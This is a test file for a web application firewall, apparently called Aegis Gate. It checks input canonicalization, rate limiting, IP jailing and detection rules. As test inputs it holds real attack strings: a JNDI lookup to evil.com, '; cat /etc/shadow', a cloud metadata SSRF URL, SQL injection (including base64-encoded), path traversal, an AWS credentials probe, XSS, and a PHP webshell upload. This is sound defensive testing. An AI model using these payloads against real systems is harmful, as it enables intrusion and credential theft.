import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { canonicalizeInput } from '../src/engine/canonicalizer.js';
import { computeRequestEntropy } from '../src/engine/entropy.js';
import { IpReputationManager } from '../src/quarantine/ip-reputation.js';
import { createDefaultRuleRegistry } from '../src/rules/default-rules.js';
import { WafInspector } from '../src/engine/inspector.js';
import { ScannerRule } from '../src/rules/scanner.rule.js';
import { ZeroDayRule } from '../src/rules/zeroday.rule.js';
import { RceRule } from '../src/rules/rce.rule.js';
import { SsrfRule } from '../src/rules/ssrf.rule.js';
import { SqliRule } from '../src/rules/sqli.rule.js';
import { TraversalRule } from '../src/rules/traversal.rule.js';
import { SensitiveProbeRule } from '../src/rules/sensitive-probe.rule.js';
import { CmsProbeRule } from '../src/rules/cms-probe.rule.js';
import { XssRule } from '../src/rules/xss.rule.js';

describe('Aegis Gate PEP — Canonicalizer Engine', () => {
  it('should recursively decode multi-encoded URLs', () => {
    const doubleEncoded = '%252e%252e%252fetc%252fpasswd';
    const canonical = canonicalizeInput(doubleEncoded);
    assert.strictEqual(canonical, '../etc/passwd');
  });

  it('should strip null bytes and SQL comments', () => {
    const raw = 'UN/* comment */ION \0 SELECT';
    const canonical = canonicalizeInput(raw);
    assert.strictEqual(canonical, 'UN ION SELECT');
  });

  it('should decode HTML entities, Hex/Unicode escapes, and normalize traversal paths (Verrou n°2 P1)', () => {
    const htmlEncoded = '&#x3c;script&#x3e;alert&#40;1&#41;&lt;/script&gt;';
    assert.strictEqual(canonicalizeInput(htmlEncoded), '<script>alert(1)</script>');

    const hexUnicode = '\\x2e\\x2e/\\u0065tc//./passwd';
    assert.strictEqual(canonicalizeInput(hexUnicode), '../etc/passwd');
  });

  it('should automatically decode embedded Base64 attack payloads (Verrou n°2 P1)', () => {
    // Base64 for "UNION SELECT username,password FROM users--"
    const b64Sqli = 'VU5JT04gU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gdXNlcnMtLQ==';
    const canonical = canonicalizeInput(`/api/search?q=${b64Sqli}`);
    assert.ok(canonical.includes('UNION SELECT username,password FROM users--'));
  });
});

describe('Aegis Gate PEP — Shannon Entropy Calculation', () => {
  it('should compute low entropy for repetitive text', () => {
    const entropy = computeRequestEntropy('aaaaaa');
    assert.ok(entropy < 1.0, `Expected low entropy, got ${entropy}`);
  });

  it('should compute higher entropy for high-diversity random tokens', () => {
    const entropy = computeRequestEntropy('8f9a2b7c4d1e0f3a6b5c9d2e4f7a1b0c');
    assert.ok(entropy > 3.0, `Expected higher entropy, got ${entropy}`);
  });
});

describe('Aegis Gate PEP — IP Reputation Manager, Rate Limiter & Auto-Jail (Verrou n°3 P1)', () => {
  it('should manage banned IPs dynamically', () => {
    const ipMgr = new IpReputationManager();
    assert.strictEqual(ipMgr.isBanned('192.168.1.100'), false);

    ipMgr.ban('192.168.1.100');
    assert.strictEqual(ipMgr.isBanned('192.168.1.100'), true);
    assert.strictEqual(ipMgr.size(), 1);

    ipMgr.unban('192.168.1.100');
    assert.strictEqual(ipMgr.isBanned('192.168.1.100'), false);

    ipMgr.setAll(['10.0.0.1', '10.0.0.2']);
    assert.strictEqual(ipMgr.size(), 2);
    assert.strictEqual(ipMgr.isBanned('10.0.0.1'), true);
    assert.strictEqual(ipMgr.isBanned('10.0.0.2'), true);

    ipMgr.clear();
    assert.strictEqual(ipMgr.size(), 0);
  });

  it('should enforce sliding-window rate limit (60 req / 10 s -> HTTP 429)', () => {
    const ipMgr = new IpReputationManager({ rateLimitMaxReq: 5, rateLimitWindowMs: 10_000 });
    const testIp = '203.0.113.50';
    for (let i = 0; i < 5; i++) {
      assert.strictEqual(ipMgr.checkRateLimit(testIp, 1000 + i).limited, false);
    }
    const sixth = ipMgr.checkRateLimit(testIp, 1006);
    assert.strictEqual(sixth.limited, true);
    assert.strictEqual(sixth.retryAfterSec, 10);
  });

  it('should auto-jail an IP for 15 minutes after 3 critical offenses in 5 minutes', () => {
    const ipMgr = new IpReputationManager({ autoJailThreshold: 3 });
    const attackerIp = '198.51.100.88';
    assert.strictEqual(ipMgr.recordOffense(attackerIp, 95, 'SQL_INJECTION', 1000).autoJailed, false);
    assert.strictEqual(ipMgr.recordOffense(attackerIp, 98, 'COMMAND_INJECTION_RCE', 2000).autoJailed, false);
    const third = ipMgr.recordOffense(attackerIp, 99, 'ZERO_DAY_VIRTUAL_PATCH', 3000);
    assert.strictEqual(third.autoJailed, true);
    assert.strictEqual(ipMgr.isBanned(attackerIp), true);
  });
});

describe('Aegis Gate PEP — Individual WAF Rules', () => {
  const dummyCtx = (headers: Record<string, string> = {}) => ({
    url: '/test',
    method: 'GET',
    headers,
    rawBody: '',
    byteLength: 0,
    clientIp: '127.0.0.1'
  });

  it('ScannerRule should flag pentest tools User-Agents', () => {
    const rule = new ScannerRule();
    const matchNikto = rule.evaluate(dummyCtx({ 'user-agent': 'Nikto/2.1.6' }));
    assert.ok(matchNikto !== null);
    assert.strictEqual(matchNikto?.threatType, 'PENTEST_SCANNER_DETECTED');

    const matchClean = rule.evaluate(dummyCtx({ 'user-agent': 'Mozilla/5.0 (Windows NT 10.0)' }));
    assert.strictEqual(matchClean, null);
  });

  it('ZeroDayRule should flag PHP2Shell and JNDI lookups', () => {
    const rule = new ZeroDayRule();
    const matchJndi = rule.evaluate(dummyCtx(), '${jndi:ldap://evil.com/a}');
    assert.ok(matchJndi !== null);
    assert.strictEqual(matchJndi?.threatType, 'ZERO_DAY_VIRTUAL_PATCH');

    const matchPhp2Shell = rule.evaluate(dummyCtx(), 'cve-2026-109618 payload');
    assert.ok(matchPhp2Shell !== null);
  });

  it('RceRule should flag system command injections', () => {
    const rule = new RceRule();
    const match = rule.evaluate(dummyCtx(), '; cat /etc/shadow');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'COMMAND_INJECTION_RCE');
  });

  it('SsrfRule should flag cloud metadata IPs', () => {
    const rule = new SsrfRule();
    const match = rule.evaluate(dummyCtx(), 'http://169.254.169.254/latest/meta-data/');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'SSRF_METADATA_PROBE');
  });

  it('SqliRule should flag UNION SELECT and comment attacks', () => {
    const rule = new SqliRule();
    const match = rule.evaluate(dummyCtx(), "' UNION SELECT 1,2,username,password FROM users--");
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'SQL_INJECTION');

    // Vérifier l'absence de faux positifs sur les jetons OAuth contenant '--' (ex: session_state Keycloak)
    const oauthUrl = '/api/auth/callback?state=aa9789d9b417d8c6d41cf598c7efbb45&session_state=hPl3L99KOvbcIJ68HT8RJ--m&iss=https%3A%2F%2Fauth.aivo.fr%2Frealms%2Faegis&code=d644050e-e919-cfc5-79e8-16cbb45e8a46.hPl3L99KOvbcIJ68HT8RJ--m.ad55990a-e2bb-4d5d-96f6-4130145ecc82';
    const matchOauth = rule.evaluate(dummyCtx(), oauthUrl);
    assert.strictEqual(matchOauth, null, 'OAuth callback URL should NOT be flagged as SQL injection');
  });

  it('TraversalRule should flag /etc/passwd and directory traversal', () => {
    const rule = new TraversalRule();
    const match = rule.evaluate(dummyCtx(), '../../../../etc/passwd');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'PATH_TRAVERSAL_LFI');
  });

  it('SensitiveProbeRule should flag private keys and configs', () => {
    const rule = new SensitiveProbeRule();
    const match = rule.evaluate(dummyCtx(), '/.aws/credentials');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'SENSITIVE_FILE_PROBE');
  });

  it('CmsProbeRule should flag admin scans', () => {
    const rule = new CmsProbeRule();
    const match = rule.evaluate(dummyCtx(), '/wp-login.php');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'CMS_PHP_BOT_PROBE');
  });

  it('XssRule should flag script injection and handlers', () => {
    const rule = new XssRule();
    const match = rule.evaluate(dummyCtx(), '<script>alert(1)</script>');
    assert.ok(match !== null);
    assert.strictEqual(match?.threatType, 'XSS_ATTEMPT');
  });
});

describe('Aegis Gate PEP — Full WafInspector Pipeline & Protocol Hardening (Verrou n°4 P1)', () => {
  const ruleRegistry = createDefaultRuleRegistry();
  const ipReputation = new IpReputationManager();
  let maxPayload = 32768;
  const inspector = new WafInspector(ruleRegistry, ipReputation, () => maxPayload);

  it('should block banned IP immediately', () => {
    ipReputation.ban('198.51.100.42');
    const verdict = inspector.inspect('/api/data', 'GET', {}, '', 0, '198.51.100.42');
    assert.strictEqual(verdict.blocked, true);
    assert.strictEqual(verdict.threat_type, 'BANNED_IP_BLACKLIST');
    assert.strictEqual(verdict.http_status, 403);
    ipReputation.unban('198.51.100.42');
  });

  it('should return 413 for payload exceeding limit', () => {
    maxPayload = 1000;
    const verdict = inspector.inspect('/api/upload', 'POST', { 'content-length': '2000' }, '', 2000, '127.0.0.1');
    assert.strictEqual(verdict.blocked, true);
    assert.strictEqual(verdict.http_status, 413);
    assert.ok(verdict.threat_type.includes('413'));
    maxPayload = 32768;
  });

  it('should return 431 for oversized HTTP headers (> 4 KB single header or > 8 KB total)', () => {
    const hugeHeader = 'A'.repeat(4200);
    const verdict = inspector.inspect('/api/v1/test', 'GET', { 'x-custom-token': hugeHeader }, '', 0, '127.0.0.1');
    assert.strictEqual(verdict.blocked, true);
    assert.strictEqual(verdict.http_status, 431);
    assert.ok(verdict.threat_type.includes('431'));
  });

  it('should block malformed multipart/form-data or disguised executable uploads (.jpg.php)', () => {
    const noBoundary = inspector.inspect(
      '/api/upload',
      'POST',
      { 'content-type': 'multipart/form-data' },
      '--abc',
      5,
      '127.0.0.1'
    );
    assert.strictEqual(noBoundary.blocked, true);
    assert.strictEqual(noBoundary.threat_type, 'MALFORMED_MULTIPART_RFC_VIOLATION');

    const webshellBody =
      '--boundary123\r\nContent-Disposition: form-data; name="avatar"; filename="avatar.jpg.php"\r\n\r\n<?php system($_GET["c"]); ?>\r\n--boundary123--';
    const webshellVerdict = inspector.inspect(
      '/api/upload',
      'POST',
      { 'content-type': 'multipart/form-data; boundary=boundary123' },
      webshellBody,
      webshellBody.length,
      '127.0.0.1'
    );
    assert.strictEqual(webshellVerdict.blocked, true);
    assert.strictEqual(webshellVerdict.threat_type, 'MALICIOUS_UPLOAD_EXECUTABLE_EXTENSION');
  });

  it('should block Base64-obfuscated SQLi through canonicalization pipeline', () => {
    // Base64 for "UNION SELECT 1,2,username,password FROM users--"
    const b64 = Buffer.from('UNION SELECT 1,2,username,password FROM users--').toString('base64');
    const verdict = inspector.inspect(`/api/items?filter=${b64}`, 'GET', {}, '', 0, '127.0.0.1');
    assert.strictEqual(verdict.blocked, true);
    assert.strictEqual(verdict.threat_type, 'SQL_INJECTION');
  });

  it('should allow clean legitimate traffic', () => {
    const verdict = inspector.inspect('/api/v1/metrics', 'GET', { 'user-agent': 'curl/7.88.1' }, '', 0, '127.0.0.1');
    assert.strictEqual(verdict.blocked, false);
    assert.strictEqual(verdict.decision, 'ALLOW');
    assert.strictEqual(verdict.http_status, 200);
    assert.strictEqual(verdict.threat_type, 'CLEAN_TRAFFIC');
  });
});
